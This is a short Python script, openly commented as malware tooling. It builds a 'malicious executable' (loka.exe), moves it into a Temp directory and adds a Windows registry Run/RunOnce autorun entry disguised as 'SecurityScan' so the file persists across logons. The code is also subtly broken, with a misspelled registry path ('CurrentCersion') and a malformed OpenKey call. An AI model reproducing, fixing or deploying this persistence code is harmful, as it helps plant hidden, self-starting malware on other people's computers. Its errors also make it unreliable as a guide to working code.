import os, shutil, winreg

# The directory where we want to put our malicious code, folder called tem
filedir = os.path.join(os.getcwd(), "Temp")
filename = "loka.exe"
filepath = os.path.join(filedir, filename)

# cleanup here to make sure that if the file already exists
if os.path.isfile(filepath):
    os.remove(filepath)

# Use BuildExe to create malicious executable
# convert a Python file into malicious executable
os.system("python BuildExe.py")

# Move malicious executable to desired directory
shutil.move(filename, filedir)

# Windows default autorun keys
# HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
# HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
# HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
# HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce

regkey = 1

if regkey < 2:
    reghive = winreg.HKEY_CURRENT_USER
else:
    reghive = winreg.HKEY_LOCAL_MACHINE
if (regkey % 2) == 0:
    regpath = "SOFTWARE\Microsoft\Windows\CurrentCersion\Run"
else:
    regpath = "SOFTWARE\Microsoft\Windows\CurrentCersion\RunOnce"


# Add registry autorun key
reg = winreg.ConnectRegistry(None,reghive) # None related to local machine
key = winreg.OpenKey(reg.regpath,0,access=winreg.KEY_WRITE)
winreg.SetValueEx(key,"SecurityScan",0,winreg.REG_SZ,filepath)


